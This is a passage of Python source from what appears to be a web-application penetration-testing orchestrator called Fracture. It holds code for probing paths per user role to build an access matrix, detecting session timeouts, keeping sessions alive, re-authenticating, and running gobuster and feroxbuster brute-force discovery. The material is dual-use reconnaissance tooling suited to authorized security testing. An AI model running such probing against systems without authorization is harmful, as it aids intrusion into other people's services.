def _print_banner() -> None:
    _tprint(f"{Fore.RED}{_BANNER}{Style.RESET_ALL}")
    _tprint(f"{Fore.CYAN}  Fracture v{VERSION} — Web Application Penetration Testing Orchestrator{Style.RESET_ALL}")
    _tprint(f"{Fore.CYAN}  OWASP Top 10 2025 Coverage: A01–A10{Style.RESET_ALL}\n")


def _write_preliminary_access_matrix(out: "OutputManager", target: dict,
                                      roles: "list[str]") -> None:
    """Write access_matrix.json from current structure_map paths without probing.
    Crucible can display the growing path list in real time; Phase 20 fills in
    actual HTTP statuses per role once probing is complete.
    """
    sm_path = out.root / "structure_map.json"
    am_path = out.root / "access_matrix.json"
    try:
        sm = json.loads(sm_path.read_text()) if sm_path.exists() else {}
    except Exception:
        return
    all_paths = sorted(sm.get("paths", {}).keys())
    if not all_paths:
        return
    try:
        existing_am = json.loads(am_path.read_text()) if am_path.exists() else {}
    except Exception:
        existing_am = {}
    existing_entries = {e["path"]: e for e in existing_am.get("paths", [])}
    _pu_wpam = urllib.parse.urlparse(target["url"])
    base_url = f"{_pu_wpam.scheme}://{_pu_wpam.netloc}"
    sm_path_data = sm.get("paths", {})
    # Compute merged roles: start from existing file, add module-level role list
    # (_all_roles_ctx is populated as soon as _collected_roles is known, so even
    # the very first write during recon carries the correct column names), then
    # any caller-supplied roles.
    merged_roles = list(existing_am.get("roles", []))
    for r in _all_roles_ctx + list(roles):
        if r not in merged_roles:
            merged_roles.append(r)
    # Which role is currently being tested?
    # Safe because pre-context phases use _scan_ctx["role"]="" (_seed_active=False),
    # so only the explicitly running role's column is ever updated here.
    path_entries = []
    for p in all_paths:
        if p in existing_entries:
            entry = dict(existing_entries[p])
            entry["access"] = dict(entry.get("access", {}))
            # Null-initialize any role not yet recorded for this path.
            for r in merged_roles:
                if r not in entry["access"]:
                    entry["access"][r] = None
            path_entries.append(entry)
        else:
            # New path — all role columns start as None.
            # Per-role HTTP codes are filled exclusively by _probe_role_paths,
            # which uses each role's actual session. Never seed from the
            # structure_map write-once status (that is Role 1's code and would
            # propagate it to every other role, causing all roles to appear
            # identical in the Access Matrix).
            access = {r: None for r in merged_roles}
            path_entries.append({"path": p, "url": base_url + p, "access": access})
    data = {
        "roles": merged_roles,
        "most_privileged": existing_am.get("most_privileged"),
        "privilege_counts": existing_am.get("privilege_counts", {}),
        "paths": path_entries,
    }
    try:
        am_path.write_text(json.dumps(data, indent=2))
    except Exception:
        pass


def _reauth_session(cfg: dict, target: dict, role_label: str) -> "requests.Session | None":
    """Build a fresh authenticated session for re-auth inside access-matrix loops.

    When the initial auth required Chrome/headless SPA landing resolution
    (cfg["_auth_needs_spa_resolve"] is True), the bare API POST sets a cookie
    but does NOT produce a fully authenticated session — the SPA client-side
    routing step is needed.  This helper runs _resolve_spa_landing after the
    credential POST so the Chrome-transferred cookies make the session valid.

    Returns the session, or None on failure.
    """
    fresh = _build_auth_session(cfg, no_interactive=True, role_label=role_label)
    if fresh is None:
        vc.log(f"[auth] Re-auth failed for role '{role_label}' — "
               f"session will be unauthenticated", "WARNING")
        return None
    if cfg.get("_auth_needs_spa_resolve"):
        try:
            _resolve_spa_landing(target, cfg, fresh, target["url"])
        except Exception as _sre:
            vc.log(f"[auth] SPA re-auth landing resolution failed: {_sre}", "WARNING")
    return fresh


# ── Session Keepalive ────────────────────────────────────────────────────
# Background thread that periodically pings a known-200 path on the active
# session to prevent server-side idle timeout.  Especially important for
# targets with aggressive session expiry (e.g. 60 s) where long-running
# subprocess phases (nuclei, nikto, gobuster) leave the requests.Session
# idle for minutes.
#
# Usage:
#   _ka = _SessionKeepalive(sess, target, cfg)
#   _ka.start()
#   ...  # long-running phase
#   _ka.stop()

# ── Session timeout detection ─────────────────────────────────────────────────

_SESSION_TIMEOUT_PROBE_INTERVALS = [30, 60, 90, 120, 180, 300]
_SESSION_TIMEOUT_MIN_KEEPALIVE   = 10   # seconds
_SESSION_TIMEOUT_MAX_KEEPALIVE   = 60   # seconds
_SESSION_EXPIRED_CODES           = frozenset({301, 302, 303, 307, 308, 401, 403})



def _detect_session_timeout(sess: "requests.Session", target: dict,
                            cfg: dict, out: "OutputManager",
                            canary_url: str = "",
                            timeout: int = 10) -> "int | None":
    """Probe the server's session idle timeout.

    Sends heartbeat GETs at increasing intervals.  Returns the detected
    timeout in seconds, or None if the session survived the longest
    interval (300 s).

    **Time-intensive** — only called when:
      1. cfg.get("detect_session_timeout") is truthy (opt-in), OR
      2. A quick 30 s probe reveals session expiry (aggressive timeout).
    """
    phase = "recon"
    url = canary_url or target["url"]
    verify = cfg.get("verify_ssl", False)

    # Confirm the session is alive before starting
    try:
        _pre = sess.get(url, timeout=timeout, allow_redirects=False,
                        verify=verify)
        if _pre.status_code in _SESSION_EXPIRED_CODES:
            vc.log("[session-timeout] Session already dead before probing — "
                   "cannot detect timeout", "WARNING")
            return None
    except Exception as _e:
        vc.error(f"[session-timeout] Pre-probe failed: {_e}")
        return None

    vc.log("[session-timeout] Probing server session idle timeout ...", "INFO")

    _last_ok = 0
    for _wait in _SESSION_TIMEOUT_PROBE_INTERVALS:
        vc.log(f"[session-timeout] Waiting {_wait}s ...", "INFO")
        time.sleep(_wait)
        try:
            _r = sess.get(url, timeout=timeout, allow_redirects=False,
                          verify=verify)
            if _r.status_code in _SESSION_EXPIRED_CODES:
                vc.log(f"[session-timeout] Session expired after {_wait}s idle "
                       f"(last OK at {_last_ok}s)", "WARNING")
                _detected = _last_ok if _last_ok else _wait
                # Store in target_profile.json
                _ka_interval = max(
                    _SESSION_TIMEOUT_MIN_KEEPALIVE,
                    min(_detected // 3, _SESSION_TIMEOUT_MAX_KEEPALIVE))
                _write_target_profile(out, session_timeout={
                    "detected_seconds": _detected,
                    "keepalive_interval": _ka_interval,
                    "method": "incremental_probe",
                    "expired_at": _wait,
                    "last_ok_at": _last_ok,
                })
                vc.log(f"[session-timeout] Detected idle timeout: ~{_detected}s — "
                       f"keepalive interval set to {_ka_interval}s", "SUCCESS")
                return _detected
            _last_ok = _wait
        except Exception as _e:
            vc.error(f"[session-timeout] Probe at {_wait}s failed: {_e}")
            # Network error ≠ session expiry; continue
            continue

    vc.log("[session-timeout] Session survived 300s — no aggressive timeout detected",
           "INFO")
    return None


class _SessionKeepalive:
    """Periodic session heartbeat to prevent server-side idle timeout."""

    _INTERVAL_DEFAULT = 30  # seconds between pings
    _CANARY_SKIP = frozenset({"/", "/robots.txt", "/sitemap.xml",
                              "/favicon.ico", "/index.html"})

    def __init__(self, sess: "requests.Session", target: dict, cfg: dict,
                 sm_data: "dict | None" = None, interval: int = _INTERVAL_DEFAULT,
                 landing_url: str = "",
                 detected_timeout: "int | None" = None):
        self._sess     = sess
        self._target   = target
        self._cfg      = cfg
        # Adaptive interval: use timeout/3 if session timeout was detected
        if detected_timeout is not None and detected_timeout > 0:
            _adaptive = max(10, min(detected_timeout // 3, 60))
            self._interval = _adaptive
            vc.log(f"[keepalive] Adaptive interval: {_adaptive}s "
                   f"(session timeout ~{detected_timeout}s)", "INFO")
        else:
            self._interval = interval
        self._stop_evt = threading.Event()
        self._thread   = None
        self._url      = self._pick_canary(target, sm_data, landing_url)

    def _pick_canary(self, target: dict, sm_data: "dict | None",
                     landing_url: str = "") -> "str | None":
        """Select a path that returned 200 for THIS role's session.

        Prefer the role's own landing URL (guaranteed accessible to the
        current role) over structure_map paths (crawled by Role 1 — may
        be admin-gated and produce misleading 302s for lower roles).
        """
        base = target["url"].rstrip("/")
        if landing_url:
            _lp = urllib.parse.urlparse(landing_url).path or "/"
            if _lp not in self._CANARY_SKIP:
                return landing_url
        if sm_data is None:
            return None
        paths_data = sm_data.get("paths", {})
        # Prefer a deep (auth-gated) path
        for p, info in paths_data.items():
            if (isinstance(info, dict) and info.get("status") == 200
                    and p not in self._CANARY_SKIP
                    and p.count("/") >= 2):
                return base + p
        # Fallback: any non-root 200
        for p, info in paths_data.items():
            if (isinstance(info, dict) and info.get("status") == 200
                    and p not in self._CANARY_SKIP):
                return base + p
        return None

    def start(self) -> None:
        if self._url is None or self._thread is not None:
            return
        self._stop_evt.clear()
        self._thread = threading.Thread(target=self._run, daemon=True,
                                        name="fracture-keepalive")
        self._thread.start()

    def stop(self) -> None:
        self._stop_evt.set()
        if self._thread is not None:
            self._thread.join(timeout=5)
            self._thread = None

    def update_session(self, sess: "requests.Session") -> None:
        """Swap to a new session object (e.g. after re-auth)."""
        self._sess = sess

    def _run(self) -> None:
        timeout = self._cfg.get("timeout", 10)
        verify  = self._cfg.get("verify_ssl", False)
        while not self._stop_evt.wait(self._interval):
            try:
                r = self._sess.head(self._url, timeout=max(timeout, 5),
                                    allow_redirects=False, verify=verify)
                # Silently succeed — the point is to tickle the server's
                # session timer, not to process the response.
                if r.status_code in (301, 302, 303, 307, 308):
                    vc.log("[keepalive] heartbeat got redirect — session may "
                           "be expiring faster than keepalive interval",
                           "WARNING")
            except Exception:
                pass  # network hiccup; next tick will retry


def _probe_role_paths(out: "OutputManager", target: dict, cfg: dict,
                      role_label: str, role_sess: "requests.Session | None",
                      landing_url: str = "") -> None:
    """Probe all structure_map paths that have no HTTP code for role_label yet.

    Called at the end of each credential context to guarantee role completion:
    every discovered endpoint has a real status code for the current role before
    the scan moves on.  Writes results directly into access_matrix.json.
    """
    sm_path = out.root / "structure_map.json"
    am_path = out.root / "access_matrix.json"
    try:
        sm = json.loads(sm_path.read_text()) if sm_path.exists() else {}
        am = json.loads(am_path.read_text()) if am_path.exists() else {}
    except Exception:
        return
    am_by_path = {e["path"]: e for e in am.get("paths", [])}
    all_sm_paths = sorted(sm.get("paths", {}).keys())
    if not all_sm_paths:
        return
    _pu_prp    = urllib.parse.urlparse(target["url"])
    base_url   = f"{_pu_prp.scheme}://{_pu_prp.netloc}"
    timeout    = cfg.get("timeout", 10)
    verify_ssl = cfg.get("verify_ssl", False)
    probe_sess = role_sess if role_sess is not None else requests.Session()
    if role_sess is None:
        probe_sess.verify = verify_ssl

    # ── SPA landing-page baseline ────────────────────────────────────────
    # On SPA targets (React, Angular, Vue) the server returns HTTP 200 with
    # the same HTML shell regardless of auth state — JavaScript determines
    # what to render.  This defeats the canary cross-check: when the landing
    # URL returns 200 for BOTH authenticated and unauthenticated requests,
    # a 200 cannot prove the session is alive.
    #
    # Detect by probing the landing URL once with a throwaway (no-cookies)
    # session.  If the unauthenticated probe also returns 200 with the same
    # body, the landing URL is "SPA-public" and the cross-check must be
    # bypassed — err on the side of re-authentication.
    _landing_spa_public = False
    if landing_url and role_sess is not None and role_label != "unauthenticated":
        import hashlib as _hl_probe
        try:
            _spa_auth_r = probe_sess.get(
                landing_url, timeout=timeout, allow_redirects=False,
                headers={"Accept": "text/html,application/json"})
            if _spa_auth_r.status_code == 200:
                _spa_unauth = requests.Session()
                _spa_unauth.verify = verify_ssl
                _spa_unauth_r = _spa_unauth.get(
                    landing_url, timeout=timeout, allow_redirects=False,
                    headers={"Accept": "text/html,application/json"})
                if _spa_unauth_r.status_code == 200:
                    _auth_h = _hl_probe.md5(
                        (_spa_auth_r.text or "").strip().encode("utf-8", "replace")).hexdigest()
                    _unauth_h = _hl_probe.md5(
                        (_spa_unauth_r.text or "").strip().encode("utf-8", "replace")).hexdigest()
                    if _auth_h == _unauth_h:
                        _landing_spa_public = True
                        vc.log(
                            f"[access-matrix] {role_label} landing URL "
                            f"{landing_url} is SPA-public (same 200 body "
                            f"auth vs unauth) — cross-checks disabled",
                            "INFO")
        except Exception:
            pass

    # ── Session expiry detection ──────────────────────────────────────────
    # Targets with aggressive server-side idle timeouts (e.g. 60 s) may have
    # invalidated the session between the last phase's HTTP request and this
    # probing pass.  Detect by probing a path that the structure_map recorded
    # as HTTP 200 during crawl; if it now returns a 3xx redirect (typical
    # redirect-to-login), rebuild the session from credentials in cfg.
    #
    # IMPORTANT: skip public paths (/, /robots.txt, etc.) that return 200
    # regardless of auth — they make useless canaries.
    if role_sess is not None and role_label != "unauthenticated":
        _canary_path = None
        _sm_paths_data = sm.get("paths", {})
        _CANARY_SKIP = frozenset({"/", "/robots.txt", "/sitemap.xml",
                                   "/favicon.ico", "/index.html"})
        # First pass: prefer a deep (auth-gated) path with status 200
        for _cp, _ci in _sm_paths_data.items():
            if (isinstance(_ci, dict) and _ci.get("status") == 200
                    and _cp not in _CANARY_SKIP
                    and _cp.count("/") >= 2):
                _canary_path = _cp
                break
        # Second pass: any non-root 200 path
        if _canary_path is None:
            for _cp, _ci in _sm_paths_data.items():
                if (isinstance(_ci, dict) and _ci.get("status") == 200
                        and _cp not in _CANARY_SKIP):
                    _canary_path = _cp
                    break
        if _canary_path is None and all_sm_paths:
            _canary_path = all_sm_paths[0]
        if _canary_path:
            try:
                _canary_r = probe_sess.get(
                    base_url + _canary_path, timeout=timeout, allow_redirects=False,
                    headers={"Accept": "text/html,application/json"})
                if _canary_r.status_code in (301, 302, 303, 307, 308):
                    # Cross-check: the canary was picked from Role 1's crawl
                    # and may be admin-gated.  If this role's own landing URL
                    # still returns 200, the session is alive — the canary is
                    # just restricted for this role.
                    # SKIP cross-check when the landing URL is SPA-public —
                    # a 200 from an SPA shell proves nothing about auth state.
                    _session_dead = True
                    if landing_url and not _landing_spa_public:
                        _lp_path = urllib.parse.urlparse(landing_url).path or "/"
                        if _lp_path != _canary_path:
                            try:
                                _lr = probe_sess.get(
                                    landing_url, timeout=timeout,
                                    allow_redirects=False,
                                    headers={"Accept": "text/html,application/json"})
                                if _lr.status_code in range(200, 400) and _lr.status_code not in (301, 302, 303, 307, 308):
                                    _session_dead = False
                                    vc.log(
                                        f"[access-matrix] {role_label} canary "
                                        f"{_canary_path} → {_canary_r.status_code} "
                                        f"but landing page {_lp_path} → "
                                        f"{_lr.status_code} — session alive, "
                                        f"canary is role-gated", "INFO")
                            except Exception:
                                pass
                    if _session_dead:
                        vc.log(
                            f"[access-matrix] {role_label} session expired "
                            f"(canary {_canary_path} → HTTP {_canary_r.status_code}) "
                            f"— re-authenticating", "WARNING")
                    if _session_dead:
                        try:
                            _fresh = _reauth_session(cfg, target, role_label)
                            if _fresh is not None:
                                probe_sess = _fresh
                                vc.log(f"[access-matrix] {role_label} re-authenticated OK",
                                       "INFO")
                            else:
                                vc.log(
                                    f"[access-matrix] {role_label} re-auth returned None "
                                    f"— probing with expired session", "WARNING")
                        except Exception as _rae:
                            vc.log(
                                f"[access-matrix] {role_label} re-auth failed: {_rae}",
                            "WARNING")
            except Exception:
                pass

    all_roles_in_am: list = am.get("roles", [])
    changed = False
    _reauth_budget = 5   # max mid-loop re-auths (covers >5 session expirations)
    _reauth_dead   = False  # set True when re-auth consistently produces dead sessions
    _LOGIN_LOC_RE  = re.compile(r'/login|/signin|/sign-in|/auth|/sso', re.I)

    for path in all_sm_paths:
        entry = am_by_path.get(path)
        if entry is None:
            entry = {"path": path, "url": base_url + path,
                     "access": {r: None for r in all_roles_in_am}}
            am_by_path[path] = entry
            am.setdefault("paths", []).append(entry)
        access = entry.setdefault("access", {})
        if role_label not in access:
            access[role_label] = None
        if access[role_label] is not None:
            continue  # Already probed with a real response for this role
        url = base_url + path
        _body_denied = False
        _body_len    = 0
        _waf_blocked = False
        _final_code  = 0
        try:
            r = probe_sess.get(url, timeout=timeout, allow_redirects=False,
                               headers={"Accept": "text/html,application/json"})
            _final_code = r.status_code

            # ── Mid-loop session expiry detection ─────────────────────
            # If an authenticated role gets a redirect-to-login, the
            # session has expired.  Re-authenticate and retry.
            # SKIP for SPA-public targets: on SPAs, the landing URL
            # returns the same 200 regardless of auth state, so the
            # cross-check is useless.  Role-gated paths that redirect
            # to /login are indistinguishable from session expiry.
            # Record the redirect as-is — it IS the real access code
            # for roles without permission.  The initial canary check
            # handles pre-loop session refresh.
            if (_final_code in (301, 302, 303, 307, 308)
                    and role_label != "unauthenticated"
                    and _reauth_budget > 0
                    and not _reauth_dead
                    and not _landing_spa_public):
                _loc = r.headers.get("Location", "") or ""
                if _LOGIN_LOC_RE.search(_loc):
                    # Cross-check: if the role's landing URL still works,
                    # this is an authorization deny (role-gated path), not
                    # session expiry.  Skip the cross-check when the landing
                    # URL is SPA-public (always returns 200 regardless of
                    # auth state) — that 200 proves nothing.
                    _midloop_dead = True
                    if landing_url and not _landing_spa_public:
                        try:
                            _ml_r = probe_sess.get(
                                landing_url, timeout=timeout,
                                allow_redirects=False,
                                headers={"Accept": "text/html,application/json"})
                            if _ml_r.status_code in range(200, 400) and _ml_r.status_code not in (301, 302, 303, 307, 308):
                                _midloop_dead = False
                        except Exception:
                            pass
                    if not _midloop_dead:
                        pass  # session alive — path is role-gated, not expired
                    else:
                        _reauth_budget -= 1
                        vc.log(
                            f"[access-matrix] {role_label} session expired mid-loop "
                            f"({path} → {_final_code}) — re-authenticating "
                            f"(budget: {_reauth_budget} left)", "WARNING")
                        try:
                            _fresh = _reauth_session(cfg, target, role_label)
                            if _fresh is not None:
                                probe_sess = _fresh
                                vc.log(
                                    f"[access-matrix] {role_label} re-authenticated OK",
                                    "INFO")
                                # Retry this path with the fresh session
                                r = probe_sess.get(
                                    url, timeout=timeout, allow_redirects=False,
                                    headers={"Accept": "text/html,application/json"})
                                _final_code = r.status_code
                                # If retry STILL redirects to login, the re-auth
                                # flow cannot produce a valid session for this
                                # target.  Stop wasting budget — every subsequent
                                # probe will fail identically.
                                if _final_code in (301, 302, 303, 307, 308):
                                    _retry_loc = r.headers.get("Location", "") or ""
                                    if _LOGIN_LOC_RE.search(_retry_loc):
                                        _reauth_dead = True
                                        _reauth_budget = 0
                                        vc.log(
                                            f"[access-matrix] {role_label} re-auth produced "
                                            f"a dead session (retry → {_final_code}) — "
                                            f"skipping remaining probes for this role",
                                            "WARNING")
                        except Exception as _mle:
                            vc.log(
                                f"[access-matrix] {role_label} mid-loop re-auth "
                                f"failed: {_mle}", "WARNING")

            # ── Guard: never record login-redirect as real status ──────
            # When re-auth is exhausted or dead, a 3xx to the login page
            # is a session-expiry artifact, not the path's real response.
            # Leave the slot as None so Phase 20 can try with a fresh
            # session later.
            if (_final_code in (301, 302, 303, 307, 308)
                    and role_label != "unauthenticated"
                    and (_reauth_dead or _reauth_budget <= 0)):
                try:
                    _guard_loc = r.headers.get("Location", "") or ""
                    if _LOGIN_LOC_RE.search(_guard_loc):
                        _final_code = 0  # sentinel: "not tested"
                except Exception:
                    pass

            try:
                if _is_waf_block(r):
                    _waf_blocked = True
                elif _final_code == 200:
                    _body_len    = len(r.content)
                    _body_denied = bool(_DENIAL_RE.search(r.text[:8192]))
            except Exception:
                pass
        except Exception:
            try:
                r = probe_sess.head(url, timeout=max(timeout // 2, 3), allow_redirects=False)
                _final_code = r.status_code
            except Exception:
                pass
        # Record only real results (0 = not tested, leave as None for later retry)
        if _final_code > 0:
            access[role_label] = _final_code
        if _final_code in (200, 403) or _waf_blocked:
            _meta = entry.setdefault("access_meta", {})
            _meta[role_label] = {
                "body_len":    _body_len,
                "body_denied": _body_denied,
                "waf_blocked": _waf_blocked,
            }
        changed = True
    if changed:
        try:
            am_path.write_text(json.dumps(am, indent=2))
        except Exception:
            pass


def _score_role_access(out: "OutputManager", target: dict, role_label: str) -> dict:
    am_path = out.root / "access_matrix.json"
    sm_path = out.root / "structure_map.json"
    try:
        am = json.loads(am_path.read_text()) if am_path.exists() else {}
        sm = json.loads(sm_path.read_text()) if sm_path.exists() else {}
    except Exception:
        return {"n200": 0, "n200_priv": 0, "body_weight": 0, "score": 0}

    sm_paths = sm.get("paths", {})
    n200 = 0
    n200_priv = 0
    body_weight = 0
    for entry in am.get("paths", []):
        status = entry.get("access", {}).get(role_label)
        if status != 200:
            continue
        n200 += 1
        path = entry.get("path", "")
        if _PRIV_PATH_RE.search(path):
            n200_priv += 1
        sm_entry = sm_paths.get(path, {})
        body_weight += sm_entry.get("body_len", 0) if isinstance(sm_entry, dict) else 0

    score = n200 + (n200_priv * 5) + (body_weight // 1024)
    return {"n200": n200, "n200_priv": n200_priv, "body_weight": body_weight, "score": score}


def _run_buster_only(target: dict, cfg: dict, out: "OutputManager",
                     sess: "requests.Session",
                     wc_baseline=None,
                     role_label: str = "") -> list:
    url     = target["url"]
    phase   = "recon"
    timeout = cfg.get("timeout", 10)
    sfx     = ("_" + re.sub(r'[^\w]', '_', role_label)[:30]) if role_label else ""

    gobuster    = _find_tool("gobuster")
    feroxbuster = _find_tool("feroxbuster")
    # Stealth mode: disable both brute-forcers. _run_buster_only is the
    # per-role buster runner invoked from authenticated/cross-role
    # contexts; same CF bot-fight concern as _phase_recon and
    # _phase_endpoint_tools.
    if cfg.get("_waf_stealth_applied"):
        if gobuster or feroxbuster:
            vc.log(
                f"[buster] Skipping per-role gobuster + feroxbuster"
                f"{(' for role ' + role_label) if role_label else ''} — "
                "stealth mode active.",
                "INFO",
            )
        gobuster    = None
        feroxbuster = None
    wordlist_dir  = _find_wordlist(
        "Discovery/Web-Content/raft-large-directories.txt",
        cfg.get("gobuster_wordlist", ""),
    )
    wordlist_file = _find_wordlist("raft-large-files.txt")

    # Read CDN from target_profile to throttle busters if WAF/CDN detected
    try:
        _rbo_cdn = json.loads(
            (out.root / "target_profile.json").read_text()
        ).get("cdn", "") or ""
    except Exception:
        _rbo_cdn = ""
    _rbo_fer_sc = "200,204,301,302,307" if _rbo_cdn else "200,204,301,302,307,401,403"
    _rbo_threads = "5" if _rbo_cdn else "30"

    discovered: list = []

    # ── Dirs: gobuster ─────────────────────────────────────────────────────────
    if wc_baseline is None and gobuster and Path(wordlist_dir).exists():
        out_f = out.output_path(phase, f"gobuster_{target['hostname']}{sfx}")
        # 2026-06-11 review round 5: use canonical cmd builder
        cmd = _build_gobuster_dir_cmd(gobuster, url, wordlist_dir,
                                        _rbo_threads, out_f, sess)
        vc.log(f"[recon] Running gobuster (dirs){' for ' + role_label if role_label else ''} ...", "INFO")
        _gobuster_run(cmd, out_f, "recon", out)
        if out_f.exists():
            try:
                _sm_ps, _sm_rd = {}, {}
                _gob_res = _filter_buster_wildcards(
                    _parse_gobuster_with_status(out_f, url), sess, timeout)
                for _gu, _gs, _gr in _gob_res:
                    discovered.append(_gu)
                    _sp = urllib.parse.urlparse(_gu).path or "/"
                    _sm_ps[_sp] = _gs
                    if _gr:
                        _sm_rd[_sp] = _gr
                if _sm_ps:
                    _write_structure_map(out, target, path_statuses=_sm_ps,
                                         path_redirects=_sm_rd or None,
                                         evidence_files=[str(out_f)],
                                         source="gobuster")
            except Exception:
                pass

    # ── Dirs: feroxbuster ──────────────────────────────────────────────────────
    if feroxbuster and Path(wordlist_dir).exists():
        fer_out = out.output_path(phase, f"feroxbuster_{target['hostname']}{sfx}")
        # 2026-06-11 review round 5: use canonical cmd builder
        cmd = _build_feroxbuster_dir_cmd(feroxbuster, url, wordlist_dir,
                                          _rbo_threads, _rbo_fer_sc,
                                          fer_out, sess, _rbo_cdn)
        vc.log(f"[recon] Running feroxbuster (dirs){' for ' + role_label if role_label else ''} ...", "INFO")
        _fer_proc = None
        try:
            _fer_proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(_fer_proc)
            _fer_proc.communicate(timeout=300)
            _deregister_proc(_fer_proc)
            out.log_command("feroxbuster", cmd, fer_out)
        except subprocess.TimeoutExpired:
            _kill_proc_tree(_fer_proc); _fer_proc.communicate(); _deregister_proc(_fer_proc)
            vc.log("[recon] feroxbuster (dirs) timed out after 300s — killed", "WARNING")
            out.log_error("feroxbuster", cmd, "timed out after 300s")
            _timeout_action_item(out, "feroxbuster", target, 300)
        except Exception as e:
            if _fer_proc:
                try: _kill_proc_tree(_fer_proc); _fer_proc.communicate()
                except Exception: pass
                _deregister_proc(_fer_proc)
            out.log_error("feroxbuster", cmd, str(e))
        if fer_out.exists():
            try:
                _sm_ps, _sm_rd = {}, {}
                _fer_res = _filter_buster_wildcards(
                    _parse_feroxbuster_with_status(fer_out), sess, timeout)
                for _fu, _fs, _fr in _fer_res:
                    discovered.append(_fu)
                    _sp = urllib.parse.urlparse(_fu).path or "/"
                    _sm_ps[_sp] = _fs
                    if _fr:
                        _sm_rd[_sp] = _fr
                if _sm_ps:
                    _write_structure_map(out, target, path_statuses=_sm_ps,
                                         path_redirects=_sm_rd or None,
                                         evidence_files=[str(fer_out)],
                                         source="feroxbuster")
            except Exception:
                pass

    # ── Files: gobuster ────────────────────────────────────────────────────────
    if wc_baseline is None and gobuster and Path(wordlist_file).exists():
        gob_files_out = out.output_path(phase, f"gobuster_files_{target['hostname']}{sfx}")
        cmd = [gobuster, "dir", "-u", url, "-w", wordlist_file, "-t", _rbo_threads,
               "-q", "-k", "-o", str(gob_files_out)]
        cmd += _buster_auth_flags(sess)
        vc.log(f"[recon] Running gobuster (files){' for ' + role_label if role_label else ''} ...", "INFO")
        _gobuster_run(cmd, gob_files_out, "recon", out)
        if gob_files_out.exists():
            try:
                _sm_ps, _sm_rd = {}, {}
                _gobf_res = _filter_buster_wildcards(
                    _parse_gobuster_with_status(gob_files_out, url), sess, timeout)
                for _gu, _gs, _gr in _gobf_res:
                    discovered.append(_gu)
                    _sp = urllib.parse.urlparse(_gu).path or "/"
                    _sm_ps[_sp] = _gs
                    if _gr:
                        _sm_rd[_sp] = _gr
                if _sm_ps:
                    _write_structure_map(out, target, path_statuses=_sm_ps,
                                         path_redirects=_sm_rd or None,
                                         evidence_files=[str(gob_files_out)],
                                         source="gobuster")
            except Exception:
                pass

    # ── Files: feroxbuster ─────────────────────────────────────────────────────
    if feroxbuster and Path(wordlist_file).exists():
        fer_files_out = out.output_path(phase, f"feroxbuster_files_{target['hostname']}{sfx}")
        cmd = [
            feroxbuster, "--url", url, "--wordlist", wordlist_file,
            "--depth", "2", "--threads", _rbo_threads, "--quiet",
            "--status-codes", _rbo_fer_sc,
            "--output", str(fer_files_out), "--insecure",
            "--auto-tune", "--time-limit", "4m",
        ]
        if _rbo_cdn:
            cmd += ["--rate-limit", "25"]
        cmd += _buster_auth_flags(sess)
        vc.log(f"[recon] Running feroxbuster (files){' for ' + role_label if role_label else ''} ...", "INFO")
        _fer_files_proc = None
        try:
            _fer_files_proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(_fer_files_proc)
            _fer_files_proc.communicate(timeout=300)
            _deregister_proc(_fer_files_proc)
            out.log_command("feroxbuster", cmd, fer_files_out)
        except subprocess.TimeoutExpired:
            _kill_proc_tree(_fer_files_proc); _fer_files_proc.communicate(); _deregister_proc(_fer_files_proc)
            vc.log("[recon] feroxbuster (files) timed out after 300s — killed", "WARNING")
            out.log_error("feroxbuster", cmd, "timed out after 300s")
            _timeout_action_item(out, "feroxbuster", target, 300)
        except Exception as e:
            if _fer_files_proc:
                try: _kill_proc_tree(_fer_files_proc); _fer_files_proc.communicate()
                except Exception: pass
                _deregister_proc(_fer_files_proc)
            out.log_error("feroxbuster", cmd, str(e))
        if fer_files_out.exists():
            try:
                _sm_ps, _sm_rd = {}, {}
                _ferf_res = _filter_buster_wildcards(
                    _parse_feroxbuster_with_status(fer_files_out), sess, timeout)
                for _fu, _fs, _fr in _ferf_res:
                    discovered.append(_fu)
                    _sp = urllib.parse.urlparse(_fu).path or "/"
                    _sm_ps[_sp] = _fs
                    if _fr:
                        _sm_rd[_sp] = _fr
                if _sm_ps:
                    _write_structure_map(out, target, path_statuses=_sm_ps,
                                         path_redirects=_sm_rd or None,
                                         evidence_files=[str(fer_files_out)],
                                         source="feroxbuster")
            except Exception:
                pass

    # Deduplicate and return
    seen_urls: set = set()
    result: list = []
    for u in discovered:
        u = u.rstrip("/")
        if u and u not in seen_urls:
            seen_urls.add(u)
            result.append(u)
    return sorted(result)


def _retroactive_probe(out: "OutputManager", target: dict, cfg: dict,
                       new_urls: list,
                       completed_roles: "dict[str, requests.Session | None]") -> None:
    if not new_urls or not completed_roles:
        return
    am_path = out.root / "access_matrix.json"
    sm_path = out.root / "structure_map.json"
    try:
        am = json.loads(am_path.read_text()) if am_path.exists() else {}
        sm = json.loads(sm_path.read_text()) if sm_path.exists() else {}
    except Exception:
        return
    _pu_rp    = urllib.parse.urlparse(target["url"])
    base_url  = f"{_pu_rp.scheme}://{_pu_rp.netloc}"
    timeout   = cfg.get("timeout", 10)
    verify    = cfg.get("verify_ssl", False)
    am_by_path = {e["path"]: e for e in am.get("paths", [])}

    def _get_probe_sess(rsess):
        if rsess is not None:
            return rsess
        s = requests.Session()
        s.verify = verify
        return s

    for url_str in new_urls:
        path = urllib.parse.urlparse(url_str).path or "/"
        if path not in am_by_path:
            access = {r: None for r in am.get("roles", [])}
            am_by_path[path] = {"path": path, "url": base_url + path, "access": access}
            am.setdefault("paths", []).append(am_by_path[path])

        entry  = am_by_path[path]
        access = entry.setdefault("access", {})
        for r in am.get("roles", []):
            if r not in access:
                access[r] = None

        full_url = base_url + path
        for role_label, rsess in completed_roles.items():
            if access.get(role_label) is not None:
                continue
            probe_sess = _get_probe_sess(rsess)
            try:
                r = probe_sess.get(full_url, timeout=timeout, allow_redirects=False,
                                   headers={"Accept": "text/html,application/json"})
                access[role_label] = r.status_code
            except Exception:
                try:
                    r = probe_sess.head(full_url, timeout=max(timeout // 2, 3),
                                        allow_redirects=False)
                    access[role_label] = r.status_code
                except Exception:
                    access[role_label] = 0

    am["paths"] = list(am_by_path.values())
    try:
        am_path.write_text(json.dumps(am, indent=2))
    except Exception:
        pass
    try:
        sm_paths = sm.setdefault("paths", {})
        for url_str in new_urls:
            path = urllib.parse.urlparse(url_str).path or "/"
            if path not in sm_paths:
                sm_paths[path] = {"status": None}
        sm_path.write_text(json.dumps(sm, indent=2))
    except Exception:
        pass


# ── Phase 20 / BFLA shared regex patterns (module-level) ────────────────────
# Shared between _phase_access_matrix and _phase_bfla so both can reference
# them without NameError.
